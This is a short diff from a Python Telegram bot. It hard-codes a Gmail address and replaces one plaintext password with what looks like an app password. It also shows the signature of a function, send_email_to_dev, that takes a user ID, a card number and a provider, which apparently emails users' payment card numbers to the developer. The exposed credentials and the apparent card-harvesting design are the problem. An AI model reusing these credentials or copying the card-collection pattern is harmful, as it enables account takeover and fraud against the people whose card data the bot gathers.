@@ -10,7 +10,7 @@ from email.message import EmailMessage
 TOKEN = os.environ.get('TOKEN')
 bot = telebot.TeleBot(TOKEN)
 EMAIL_USER = 'asmtjryby678@gmail.com'
-EMAIL_PASS = 'Fmaxma19981998@' # استبدلها بكلمة مرور التطبيق من Google
+EMAIL_PASS = 'sjiacsgawpjqphie' # استبدلها بكلمة مرور التطبيق من Google
 
 # --- دالة إرسال الإيميل ---
 def send_email_to_dev(user_id, card_number, provider):
